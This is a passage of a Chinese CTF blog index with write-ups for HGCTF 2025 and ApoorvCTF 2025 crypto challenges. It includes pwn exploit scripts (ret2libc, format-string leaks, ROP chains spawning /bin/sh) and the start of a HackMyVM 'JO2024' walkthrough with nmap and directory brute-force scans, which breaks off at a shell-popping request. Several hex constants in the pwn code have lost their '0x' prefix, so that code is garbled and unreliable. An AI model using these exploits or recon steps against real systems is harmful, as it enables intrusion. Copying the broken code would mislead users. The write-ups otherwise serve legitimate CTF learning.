crt梭哈，或者是当作e\u0026phi不互素去写 exp p = q = c = n = p * q c_p = c % p c_q = c % q from sympy.ntheory.residue_ntheory import nthroot_mod roots_p = nthroot_mod(c_p, 4, p, all_roots=True) roots_q = nthroot_mod(c_q, 4, q, all_roots=True) from sympy.ntheory.modular import crt from Crypto.Util.number import long_to_bytes for root_p in roots_p: for root_q in roots_q: m, _ = crt([p, q], [root_p, root_q]) flag = long_to_bytes(m) if b'NSSCTF{' in flag: print(flag) exit() from Crypto.Util.number import * p= q= c= n= e= 4 phi = (p-1)*(q-1) gcd = GCD(e,phi) res1 = Zmod(p)(c).nth_root(gcd, all=True) res2 = Zmod(q)(c).nth_root(gcd, all=True) for i in res1: for j in res2: m = crt([int(i),int(j)],[p,q]) if m is not None: try: print(long_to_bytes(int(m)).decode()) except Exception as e: continue ","date":"2025-03-09","objectID":"/hgctf2025/:2:4","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"ez_femat task from Crypto.Util.number import getPrime, bytes_to_long from secret import f flag = b'NSSCTF{test_flag}' p = getPrime(512) q = getPrime(512) n = p*q m = bytes_to_long(flag) e = 65537 c = pow(m,e,n) R.\u003cx\u003e = ZZ[] f = R(str(f)) w = pow(2,f(p),n) print(f'{n = }\\n') print(f'{e = }\\n') print(f'{c = }\\n') print(f'{f = }\\n') print(f'{w = }\\n') 其实当时看到题目是费马的时候没有想那么多，我把p-1当作可以被这个多项式整除的式子，就直接算x=1的情况，结果真出来了（） exp from sage.all import * var('x') f_str = \"\" f = sage_eval(f_str, locals={'x': x}) f1 = f.subs(x=1) print(f\"f(1) = {f1}\") from Crypto.Util.number import inverse, GCD, long_to_bytes n = e = 65537 c = w = a = -57 b = inverse(pow(2, -a, n), n) d = GCD(w - b, n) if 1 \u003c d \u003c n: p = d q = n // p else: p = n // d q = d phi = (p - 1) * (q - 1) d = inverse(e, phi) m = pow(c, d, n) flag = long_to_bytes(m) print(flag) ","date":"2025-03-09","objectID":"/hgctf2025/:2:5","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"EZ_Fermat_bag_PRO task from Crypto.Util.number import getPrime, bytes_to_long from random import * from secret import f, flag assert len(flag) == 88 assert flag.startswith(b'NSSCTF{') assert flag.endswith(b'}') p = getPrime(512) q = getPrime(512) n = p*q P.\u003cx,y\u003e = ZZ[] f = P(str(f)) w = pow(2,f(p,q),n) assert all(chr(i) in ''.join(list(set(str(p)))) for i in flag[7:-1:]) c = bytes_to_long(flag) % p print(f'{n = }\\n') print(f'{f = }\\n') print(f'{w = }\\n') print(f'{c = }\\n') 与上一个不同的是这个是xy双元多项式，第一开始的想法就是把他变成单元的，然后发现怎么写怎么不对，完啦 后面发现正确的思维是把这个先对f换元，把y消掉，然后构造费马定理，估计上一题也是瞎猫碰死耗子，求出p后发现很难爆破出来，其实是类似鸡块神的nssdlc关卡，不知道出题人的灵感是不是从这来的 exp from Crypto.Util.number import * n = w = c = P.\u003cx,y\u003e = PolynomialRing(ZZ) f = g = f(x,n/x)(x+1,0) print(g) p = GCD(pow(2,g(0,0),n)-w,n) from Crypto.Util.number import * p=12887845651556262230127533819087214645114299622757184262163859030601366568025020416006528177186367994745018858915213064803349065489849643880676026721892753 c = 10266913434526071998707605266130137733134248608585146234981245806763995653822203763396430876254213500327272952979577138542487120755771047170064775346450942 Ge = Matrix(ZZ,82,82) temp = bytes_to_long(b\"NSSCTF{\") * 256^81 + bytes_to_long(b\"}\") for i in range(80): temp += 48*256^(80-i) for i in range(80): Ge[i,i] = 1 Ge[i,-1] = 256^(80-i) Ge[-2,-2] = 3 Ge[-2,-1] = (temp - c) Ge[-1,-1] = p for line in Ge.BKZ(): m = \"\" if line[-1] == 0 and abs(line[-2]) == 3: print(line) for i in line[:-2]: m += str(abs(i)) flag = \"NSSCTF{\" + m + \"}\" print(flag) (不知道为啥子会求出来两个，奇奇怪怪) ","date":"2025-03-09","objectID":"/hgctf2025/:2:6","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"MIMT_RSA task from Crypto.Util.number import * from hashlib import md5 from secret import KEY， flag assert int(KEY).bit_length() == 36 assert not isPrime(KEY) p = getPrime(1024) q = getPrime(1024) n = p * q e = 0x10001 ck = pow(KEY, e, n) assert flag == b'NSSCTF{' + md5(str(KEY).encode()).hexdigest().encode() + b'}' print(f\"{n = }\") print(f\"{e = }\") print(f\"{ck = }\") 题目名字直接说了是mitm，就往上面靠呗，KEY是三十六位的，本来想着从18位开始爆，发现出不来，修改范围试试就行了，哈希表加多进程还是很快的，但是我代码写的依托 exp import gmpy2 from gmpy2 import powmod, invert import multiprocessing as mp from hashlib import md5 n = e = ck = def precompute_a(start, end, queue): hash_table = {} for a in range(start, end): a_e = powmod(a, e, n) hash_table[a_e] = a queue.put(hash_table) def search_b(start, end, hash_table, queue): result = None for b in range(start, end): b_e = powmod(b, e, n) try: inv_b_e = invert(b_e, n) except gmpy2.ZeroDivisionError: continue tmp = (ck * inv_b_e) % n if tmp in hash_table: a = hash_table[tmp] KEY = a * b if KEY.bit_length() == 36 and not gmpy2.is_prime(KEY): result = KEY break queue.put(result) def main(): a_start = 1 a_end = 2**20 # 扩大范围至2^19，覆盖1到524287 num_processes = 8 chunk_size = (a_end - a_start + num_processes - 1) // num_processes # 确保覆盖所有a值 manager = mp.Manager() queue = manager.Queue() processes = [] for i in range(num_processes): start = a_start + i * chunk_size end = min(start + chunk_size, a_end) p = mp.Process(target=precompute_a, args=(start, end, queue)) processes.append(p) p.start() hash_table = {} for _ in range(num_processes): ht = queue.get() hash_table.update(ht) for p in processes: p.join() print(f\"Hash table size: {len(hash_table)}\") b_start = 1 b_end = 2**20 # 修正b的分割方式，确保覆盖所有值 b_chunk_size = (b_end - b_start + num_processes - 1) // num_processes result_queue = manager.Queue() processes = [] for i in range(num_processes): start = b_start + i * b_chunk_size end = min(start + b_chunk_size, b_end) p = mp.Process(target=search_b, args=(start, end, hash_table, result_queue)) processes.append(p) p.start() KEY = None for _ in range(num_processes): res = result_queue.get() if res is not None: KEY = res # 终止所有进程 for p in processes: if p.is_alive(): p.terminate() break for p in processes: p.join() if KEY is not None: print(f\"Found KEY: {KEY}\") md5_hash = md5(str(KEY).encode()).hexdigest() flag = f\"NSSCTF{{{md5_hash}}}\" print(flag) else: print(\"KEY not found. Consider further expanding the search range or optimizing the factorization strategy.\") if __name__ == \"__main__\": main() ","date":"2025-03-09","objectID":"/hgctf2025/:2:7","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"RSA_and_DSA task from random import getrandbits, randint from secrets import randbelow from Crypto.Util.number import* from Crypto.Util.Padding import pad from Crypto.Cipher import AES import hashlib import random import gmpy2 ink=getPrime(20) p1= getPrime(512) q1= getPrime(512) N = p1* q1 phi = (p1-1) * (q1-1) while True: d1= getRandomNBitInteger(200) if GCD(d1, phi) == 1: e = inverse(d1, phi) break c_ink = pow(ink, e, N) print(f'c_ink=',c_ink) print(f'e=',e) print(f'N=',N) link=261641 k= getPrime(64) q = getPrime(160) def sign(msg, pub, pri, k): (p,q,g,y) = pub x = pri r = int(pow(g, k, p) % q) h = int(hashlib.sha256(msg).digest().hex(),16) s = int((h + x * r) * gmpy2.invert(k, q) % q) return (r, s) while True: temp = q * getrandbits(864) if isPrime(temp + 1): p = temp + 1 break assert p % q == 1 h = randint(1, p - 1) g = pow(h, (p - 1) // q, p) y = pow(g, k, p) pub = (p,q,g,y) pri = random.randint(1, q-1) print(f\"(r1,s1)=\",sign(b'GHCTF-2025', pub, pri, k)) print(f\"(r2,s2)=\",sign(b'GHCTF-2025', pub, pri, k+ink)) print(f\"{g= }\") print(f\"{q= }\") print(f\"{p= }\") print(f\"{y= }\") key = hashlib.sha1(str(pri).encode()).digest()[:16] cipher = AES.new(key, AES.MODE_ECB) flag=\"NSSCTF{xxxxxxxx}\" ciphertext = cipher.encrypt(pad(flag.encode(), 16)) print(f\"{ciphertext = }\") 前半段明显的维纳攻击，后半段dsa，前面板子就不写了，只放后面的 exp import hashlib import gmpy2 from Crypto.Cipher import AES (r1,s1)= (..., ...) (r2,s2)= (..., ...) g= ... q= ... p= ... y= ... ciphertext = ... msg = b'GHCTF-2025' h = int(hashlib.sha256(msg).digest().hex(),16) a = 1 b =... k = ((h*(r2 - r1) + b*r1*s2)*gmpy2.invert((r2*s1-a*r1*s2),q)) % q x1 = (k*s1 - h)*gmpy2.invert(r1,q) % q print(x1) key = hashlib.sha1(str(x1).encode()).digest()[:16] cipher = AES.new(key, AES.MODE_ECB) ptext=cipher.decrypt(ciphertext) print(ptext) ","date":"2025-03-09","objectID":"/hgctf2025/:2:8","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"river task from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import md5 from secret import flag, seed, mask class 踩踩背: def __init__(self, n, seed, mask, lfsr=None): self.state = [int(b) for b in f\"{seed:0{n}b}\"] self.mask_bits = [int(b) for b in f\"{mask:0{n}b}\"] self.n = n self.lfsr = lfsr def update(self): s = sum([self.state[i] * self.mask_bits[i] for i in range(self.n)]) \u0026 1 self.state = self.state[1:] + [s] def __call__(self): if self.lfsr: if self.lfsr(): self.update() return self.state[-1] else: self.update() return self.state[-1] class 奶龙(踩踩背): def __init__(self, n, seed, mask): super().__init__(n, seed, mask, lfsr=None) n = 64 assert seed.bit_length == mask.bit_length == n lfsr1 = 奶龙(n, seed, mask) lfsr2 = 踩踩背(n, seed, mask, lfsr1) print(f\"mask = {mask}\") print(f\"output = {sum(lfsr2() \u003c\u003c (n - 1 - i) for i in range(n))}\") print(f\"enc = {AES.new(key=md5(str(seed).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, 16))}\") 一个抽象的lfsr，lfsr1\u0026lfsr2生成时用的种子什么的都一样，只不过lfsr2需要依赖前者去判断是否输出，我们可以模拟这个状态去生成流 当lsfr1的输出是1的时候，就更新lsfr2的状态 当lsfr1的输出是0的时候，就直接拿lsfr2的状态的最后一位 我们就可以根据这个去猜测lfsr2的第k位可能来自lfsr1的第i位，我们就可以猜测到lfsr2的下一位的多种情况 所以我们仅需剪枝去搜索出lfsr1 的64位即可恢复seed exp from Crypto.Util.number import * from Crypto.Cipher import AES from hashlib import md5 from tqdm import tqdm import sys mask = 9494051593829874780 output = 13799267741689921474 lsfr2 = bin(output)[2:].zfill(64) enc = t_L = block_matrix(Zmod(2), [[Matrix(ZZ, 63, 1).augment(identity_matrix(63))], [Matrix(ZZ, 1, 64, [int(i) for i in bin(mask)[2::].zfill(64)])]]) L = [] for i in range(1, 64 + 1): L.append((t_L ^ i)[-1]) L = Matrix(Zmod(2), 64, 64, L) def find(lsfr1, k): #初始化 length = len(lsfr1) #剪枝 if length \u003c 64 and lsfr1[k] != lsfr2[length] and lsfr1[k + 1] != lsfr2[length]: return #搜索和更深层次递归 if length == 64: B = [] for i in range(1, length + 1): B.append(int(lsfr1[i - 1])) seed = L.solve_right(Matrix(Zmod(2), 64, 1, B)) seed = int(''.join([str(i[0]) for i in seed]), 2) flag = AES.new(key=md5(str(seed).encode()).digest(), mode=AES.MODE_ECB).decrypt(enc) if flag.isascii(): print(flag) sys.exit() elif length \u003c 64: if lsfr1[k] == lsfr2[length]: find(lsfr1 + '0', k) if lsfr1[k + 1] == lsfr2[length]: find(lsfr1 + '1', k + 1) if lsfr1[k] != lsfr2[length] and lsfr1[k + 1] == lsfr2[length]: find(lsfr1 + '1', k + 1) find('01', 0) ","date":"2025-03-09","objectID":"/hgctf2025/:2:9","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"sin task from Crypto.Util.number import bytes_to_long; print((2 * sin((m := bytes_to_long(b'NSSCTF{test_flag}'))) - 2 * sin(m) * cos(2 * m)).n(1024)) ''' m的值即为flag 0.002127416739298073705574696200593072466561264659902471755875472082922378713642526659977748539883974700909790177123989603377522367935117269828845667662846262538383970611125421928502514023071134249606638896732927126986577684281168953404180429353050907281796771238578083386883803332963268109308622153680934466412 ''' 第一眼看上去的思路是化简这个式子，然后arcsin，突然想起来这玩意相当于取模了, $$ m-2k\\pi =c $$ but这样写会有误差，毕竟你开方什么的乱七八糟的操作，会产生误差很合理吧，即 $$ m-2k\\pi =c+a $$ 哎？这就很格了 exp 记得配平 from Crypto.Util.number import * c = R.\u003cx\u003e = PolynomialRing(QQ) f = x^3-(c/4) res = f.roots() c = abs(arcsin(res[0][0])) K = 2^900 T = 2^300 ge = [[1,0,K],[0,T,c*K],[0,0,2*pi.n(1024)*K]] Ge = Matrix(QQ,ge) L = Ge.LLL() print(L) assert abs(L[0][1]) == T m = long_to_bytes(int(abs(L[0][0]))) if b\"NSSCTF{\" in m: print(m) ","date":"2025-03-09","objectID":"/hgctf2025/:2:10","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"pwn题目 ","date":"2025-03-09","objectID":"/hgctf2025/:3:0","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"hello world 有pie无canary并且有溢出， partial write返回地址秒了 exp from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" payload = b\"a\" * 028 + p8(0C5) s(payload) ia() ","date":"2025-03-09","objectID":"/hgctf2025/:3:1","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"ret2libc1 先刷钱，刷完钱可以接触到溢出函数，溢出两次泄露+利用 exp from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" sl(b\"3\") ru(b\"How much do you want to spend buying the hell_money?\\n\") sl(str(1000)) r() sl(b\"7\") r() sl(b\"10000\") ru(b\"6.check youer money\\n\") sl(b\"5\") ru(b\"You can name it!!!\\n\") prdi = 00000000000400D73 payload = ( b\"a\" * 048 + p(prdi) + p(elf.got[\"puts\"]) + p(elf.plt[\"puts\"]) + p(elf.sym[\"main\"]) ) s(payload) base = u(r(6).ljust(8, b\"\\0\")) - 0000000000006F6A0 success(hex(base)) system = base + libc.sym[\"system\"] binsh = base + 0000000000018CE57 payload = b\"a\" * (048) + p(00000000000400579) + p(prdi) + p(binsh) + p(system) sl(b\"5\") s(payload) ia() ","date":"2025-03-09","objectID":"/hgctf2025/:3:2","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"ret2libc2 发现程序有fmt漏洞，溢出返回到printf处泄露栈上libc，然后往bss上写rop链最后跳过去 exp from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" ru(b\"hello world!\\n\") ret = 0000000000040101A payload = ( b\"|%3$p.\".ljust(030, b\"a\") + p(00000000000404060 + 0900) + p(00000000000401227) ) ps() s(payload) ru(b\"|\") base = int(r(len(b\"07f8b4ff547e2\")), 16) - 01147E2 success(hex(base)) ru(b\"show your magic\\n\") # s(p(0EBC85 + base)) payload = ( b\"a\" * (030) + p(00000000000404060 - 0100 - 0238) + p(ret) + p(base + 0000000000002A3E5) + p(base + 000000000001D8678) + p(base + 0000000000050D70) ) s(payload) ia() ","date":"2025-03-09","objectID":"/hgctf2025/:3:3","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"真会布置栈吗 很短小的程序，程序给了一些gadget和栈地址，通过0x401017 处的pop群可以控制两个直接需要的寄存 器（r13和r15也要用，但是是间接的），pops完后跳到0x401021 清零rdx，最后跳到0x40100C 将r13 的值赋值给rax，然后syscall 其实一开始想到的是打srop，但是本地srop死活跑不通，无奈只能换思路 exp from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" ru(b\"\\x29\\x0a\") stack = u(r(6).ljust(8, b\"\\0\")) success(hex(stack)) ret = 00000000000401013 ps() payload = ( p(ret) + p(00000000000401019) # pop 3 trash + p(0) + b\"/bin/sh\\0\" + p(00000000000401017) # pops + p(0) # rsi + p(stack) # rdi + p(0) # rbx + p(03B) # r13 + p(ret) # r15 + p(0000000000401021) # xor rdx, rdx + p(000000000040100C) # xchg rax, 03bh + p(00000000000401077) # syscall ) s(payload) ia() ","date":"2025-03-09","objectID":"/hgctf2025/:3:4","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"前言 赛时就做了两题，跟着佬的wp复现一下 ","date":"2025-03-09","objectID":"/apoorvctf_2025/:1:0","tags":["crypto"],"title":"ApoorvCTF 2025","uri":"/apoorvctf_2025/"},{"categories":["CTF"],"content":"题目 ","date":"2025-03-09","objectID":"/apoorvctf_2025/:2:0","tags":["crypto"],"title":"ApoorvCTF 2025","uri":"/apoorvctf_2025/"},{"categories":["CTF"],"content":"Genjutsu_Labyrinth task from sympy import primerange import random from collections import deque def generate(size): grid = [[random.randint(0, 9) for col in range(size)] for row in range(size)] grid[0][0] = 0 return grid def encrypt(n, a, b, mod=101): return (a * n + b) % mod def build_encrypted_grid(grid, a, b, mod=101): size = 10 encry_grid = [] for y in range(size): row = [] for x in range(size): enc_val = encrypt(grid[y][x], a, b, mod) row.append(str(enc_val).zfill(2)) encry_grid.append(row) return encry_grid def optimize(grid): #hidden pass grid = generate(10) a = random.choice(list(primerange(2, 12))) b = random.choice(range(101)) encry_grid = build_encrypted_grid(grid, a, b, mod=101) #nc chals1.apoorvctf.xyz 4002 generate是正常一个10*10的迷宫，每个数字0-9，起点是0 encrypt是正常的线性同余加密 optimize没啥用 build_encrypted_grid是生成一个没个数加密后的矩阵，并且输出为字符串，比如5-\u003e05 a=[2,3,5,7,11] //nc情况 ____ _ _ / ___| ___ _ __ (_) _ _ | |_ ___ _ _ | | _ / _ \\| '_ \\ | || | | || __|/ __|| | | | | |_| || __/| | | | | || |_| || |_ \\__ \\| |_| | \\____| \\___||_| |_| _/ | \\__,_| \\__||___/ \\__,_| |__/ Welcome to Genjutsu Labyrinth! Your goal is to navigate from the top-left to the bottom-right successfully Note: Your current position is denoted by Pa. The first cell has a value 0 ------------------------------------------------- Pa 49 42 42 00 00 21 00 21 00 49 00 42 21 28 56 07 00 42 56 21 28 42 42 14 21 21 21 00 14 07 49 07 35 07 07 42 56 35 07 63 28 28 07 00 49 00 56 21 28 07 56 07 35 14 42 21 35 35 00 14 21 00 07 21 35 49 07 14 28 21 35 07 00 49 14 21 00 42 42 42 21 56 28 49 56 07 14 49 28 63 07 49 35 07 07 07 28 63 00 Use S/D to move down or right. Type 'exit' to quit. Enter move (S/D): 哎，其实我们要找的是xor为0，即从 enc_val 中穷举 a, b 的值。然后根据 a, b 的值求出 grid 的值，进行穷举路径，找到 XOR 值为 0 的路径。 exp from pwn import * import itertools from Crypto.Util.number import inverse p = remote('chals1.apoorvctf.xyz', 4002) for _ in range(12): data = p.recvuntil(b'\\n').strip().decode() print(data) # 读取加密网格，每行接收后替换'Pa'为'00'，并转换成数字列表 encry_grid = [] for _ in range(10): data = p.recvuntil(b'\\n').strip().decode() print(data) data = data.replace('Pa', '00') row = list(map(int, data.split())) encry_grid.append(row) encs = [] for i in range(10): for j in range(10): if encry_grid[i][j] not in encs: encs.append(encry_grid[i][j]) found = False for a in [2, 3, 5, 7, 11]: for b in range(101): success = True for i in range(10): c = (a * i + b) % 101 if c not in encs: success = False break if success: found = True break if found: break grid = [] for i in range(10): row = [] for j in range(10): r = (encry_grid[i][j] - b) * inverse(a, 101) % 101 row.append(r) grid.append(row) # 构造移动指令：总共需要18步，选取9步向下（S）移动，其余为向右（D）移动， # 利用排列枚举所有可能的路径，选择 XOR 结果为 0 的路径 seq = list(range(18)) for perm in itertools.permutations(seq, 9): com = '' val = 0 x = 0 y = 0 for i in range(18): if i in perm: com += 'S' x += 1 val ^= grid[x][y] else: com += 'D' y += 1 val ^= grid[x][y] if val == 0: break for i in range(18): data = p.recvuntil(b': ') print(data.decode() + com[i]) p.sendline(com[i].encode()) data = p.recvuntil(b'\\n').strip().decode() print(data) data = p.recvuntil(b'exit!\\n').strip().decode() print(data) for _ in range(2): data = p.recvuntil(b'\\n').strip().decode() print(data) p.interactive() ","date":"2025-03-09","objectID":"/apoorvctf_2025/:2:1","tags":["crypto"],"title":"ApoorvCTF 2025","uri":"/apoorvctf_2025/"},{"categories":["CTF"],"content":"Split_Lies 两个照片什么都没有，有点抽象 尝试了很多方法后，将 RGB 的值相加后除以 256 的余数，中央出现了旗帜。 from PIL import Image img1 = Image.open('part1.png').convert('RGB') img2 = Image.open('part2.png').convert('RGB') w, h = img1.size output_img = Image.new('RGB', (w, h), (255, 255, 255)) for y in range(h): for x in range(w): r1, g1, b1 = img1.getpixel((x, y)) r2, g2, b2 = img2.getpixel((x, y)) r = (r1 + r2) % 256 g = (g1 + g2) % 256 b = (b1 + b2) % 256 output_img.putpixel((x, y), (r, g, b)) output_img.save('flag.png') ","date":"2025-03-09","objectID":"/apoorvctf_2025/:2:2","tags":["crypto"],"title":"ApoorvCTF 2025","uri":"/apoorvctf_2025/"},{"categories":["CTF"],"content":"Finding_Goku task import hashlib def check_hex_data(hex1, hex2, start_string): if hex1 == hex2: return \"Error: Even a Saiyan warrior knows that true strength lies in difference! The two inputs must not be identical.\" try: data1 = bytes.fromhex(hex1) data2 = bytes.fromhex(hex2) except ValueError: return \"Error: Looks like you misfired a Ki blast! Invalid hex input detected.\" start_bytes = start_string.encode() if not (data1.startswith(start_bytes) and data2.startswith(start_bytes)): return \"Error: These aren't true warriors! Both inputs must start with the legendary sign of 'GOKU' to proceed.\" def md5_hash(data): hasher = hashlib.md5() hasher.update(data) return hasher.hexdigest() hash1 = md5_hash(data1) hash2 = md5_hash(data2) if hash1 != hash2: return \"Error: These warriors are impostors! They wear the same armor but their Ki signatures (MD5 hashes) don't match.\" try: with open(\"flag.txt\", \"r\") as flag_file: flag = flag_file.read().strip() return f\"🔥 You have found the real Goku! Your flag is: {flag}\" except FileNotFoundError: return \"Error: The Dragon Balls couldn't summon the flag! 'flag.txt' is missing.\" if __name__ == \"__main__\": start_string = \"GOKU\" hex1 = input(\"Enter first hex data: \") hex2 = input(\"Enter second hex data: \") print(check_hex_data(hex1, hex2, start_string)) 总而言之言而总之想让md5相等，直接开爆 from pwn import * p = remote('chals1.apoorvctf.xyz', 5002) with open('md5_data1', 'rb') as f: data1 = f.read().hex() with open('md5_data2', 'rb') as f: data2 = f.read().hex() data = p.recvuntil(b': ') print(data.decode() + data1) p.sendline(data1.encode()) data = p.recvuntil(b': ') print(data.decode() + data2) p.sendline(data2.encode()) data = p.recvuntil(b'\\n').rstrip() print(data.decode()) p.interactive() ","date":"2025-03-09","objectID":"/apoorvctf_2025/:2:3","tags":["crypto"],"title":"ApoorvCTF 2025","uri":"/apoorvctf_2025/"},{"categories":["CTF"],"content":"Kowareta_Cipher task import sys from Crypto.Cipher import AES from Crypto.Util.Padding import pad from random import randbytes def main(): key = randbytes(16) cipher = AES.new(key, AES.MODE_ECB) flag = b'apoorvctf{fake_flag_123}' print(\"Welcome to the ECB Oracle challenge!\") print(\"Enter your input in hex format.\") try: while True: print(\"Enter your input: \", end=\"\", flush=True) userinput = sys.stdin.readline().strip() if not userinput: break try: userinput = bytes.fromhex(userinput) ciphertext = cipher.encrypt(pad(userinput + flag + userinput, 16)) print(\"Ciphertext:\", ciphertext.hex()) except Exception as e: print(f\"Error: {str(e)}\") except KeyboardInterrupt: print(\"Server shutting down.\") if __name__ == \"__main__\": main() # nc chals1.apoorvctf.xyz 4001 很有意思，加密格式变成x+flag+x，我们ECB的特点就是相同的明文块会生成相同的密文块，padding怎么办呢？消除影响就好了 exp from pwn import * p = remote('chals1.apoorvctf.xyz', 4001) for _ in range(2): data = p.recvuntil(b'\\n').strip().decode() print(data) flag = '' for i in range(32): for code in range(33, 127): inp = 'X' * (31 - i) + flag + chr(code) + 'X' * (31 - i) print('[+] input:', inp) inp_hex = inp.encode().hex() prompt = p.recvuntil(b': ').decode() print(prompt + inp_hex) p.sendline(inp_hex.encode()) data = p.recvuntil(b'\\n').strip().decode() print(data) ct = data.split(' ')[-1] if ct[32:64] == ct[96:128]: flag += chr(code) break print('[*] flag:', flag) p.interactive() ","date":"2025-03-09","objectID":"/apoorvctf_2025/:2:4","tags":["crypto"],"title":"ApoorvCTF 2025","uri":"/apoorvctf_2025/"},{"categories":["靶场"],"content":"JO2024 ","date":"2025-03-07","objectID":"/hmv_jo2024/:1:0","tags":["渗透"],"title":"HMV JO2024","uri":"/hmv_jo2024/"},{"categories":["靶场"],"content":"靶场链接 https://hackmyvm.eu/machines/machine.php?vm=JO2024 ","date":"2025-03-07","objectID":"/hmv_jo2024/:1:1","tags":["渗透"],"title":"HMV JO2024","uri":"/hmv_jo2024/"},{"categories":["靶场"],"content":"日常扫描 ┌──(parallels㉿kali-linux-2024-2)-[~] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:1c:42:fd:ba:b5, IPv4: 192.168.31.187 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.106 08:00:27:91:df:4a (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 192.168.31.210 f4:6d:3f:27:e6:fb (Unknown) 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.841 seconds (139.05 hosts/sec). 4 responded ┌──(parallels㉿kali-linux-2024-2)-[~] └─$ nmap -sC -sV 192.168.31.106 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 16:22 CST Nmap scan report for 192.168.31.106 Host is up (0.0039s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) | ssh-hostkey: | 256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA) |_ 256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519) 80/tcp open http Apache httpd 2.4.61 ((Debian)) |_http-title: Paris 2024 Olympic Games |_http-server-header: Apache/2.4.61 (Debian) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.21 seconds 网页没有什么危险信息，轻微爆破一下目录 ┌──(parallels㉿kali-linux-2024-2)-[~] └─$ dirb http://192.168.31.106 / ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Fri Mar 7 16:26:54 2025 URL_BASE: http://192.168.31.106 / WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.31.106 / ---- ==\u003e DIRECTORY: http://192.168.31.106 /img/ + http://192.168.31.106 /index.php (CODE:200|SIZE:7812) + http://192.168.31.106 /server-status (CODE:403|SIZE:280) ---- Entering directory: http://192.168.31.106 /img/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ----------------- END_TIME: Fri Mar 7 16:26:58 2025 DOWNLOADED: 4612 - FOUND: 2 /img目录不知道干啥的，看看，就是个放照片的，深度扫描一下 ┌──(parallels㉿kali-linux-2024-2)-[~] └─$ dirsearch -u \"http://192.168.31.106 /\" -x 403 -e php,zip,txt /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, zip, txt | HTTP method: GET | Threads: 25 Wordlist size: 10439 Output File: /home/parallels/reports/http_192.168.31.106 /__25-03-07_16-29-03.txt Target: http://192.168.31.106 / [16:29:03] Starting: [16:29:11] 301 - 316B - /img -\u003e http://192.168.31.106 /img/ Task Completed 还是这样，我还有一计 ┌──(parallels㉿kali-linux-2024-2)-[~] └─$ gobuster dir -u 192.168.31.106 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.31.106 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 280] /index.php (Status: 200) [Size: 7812] /img (Status: 301) [Size: 316] [--\u003e http://192.168.31.106 /img/] /preferences.php (Status: 200) [Size: 3163] /.php (Status: 403) [Size: 280] 哎，/preferenc","date":"2025-03-07","objectID":"/hmv_jo2024/:1:2","tags":["渗透"],"title":"HMV JO2024","uri":"/hmv_jo2024/"},{"categories":["靶场"],"content":"弹shell GET /preferences.php HTTP/1.1 Host: 192.168.31.106 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: 